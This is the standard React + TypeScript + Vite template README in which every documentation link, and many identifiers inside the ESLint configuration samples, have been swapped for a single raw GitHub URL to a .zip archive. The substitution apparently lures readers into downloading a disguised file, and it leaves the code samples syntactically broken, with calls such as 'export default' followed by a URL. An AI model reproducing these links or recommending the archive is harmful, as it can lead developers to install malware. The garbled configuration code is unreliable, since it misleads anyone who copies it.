# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) uses [Babel](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) uses [SWC](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip and replace with this
      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
      // Alternatively, use this for stricter rules
      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
      // Optionally, add this for stylistic rules
      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip', 'https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip'],
        tsconfigRootDir: https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip) for React-specific lint rules:

```js
// https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip', 'https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip'],
        tsconfigRootDir: https://raw.githubusercontent.com/stupideinstein09/upahaar_doko/main/src/pages/upahaar_doko_3.6.zip,
      },
      // other options...
    },
  },
])
```
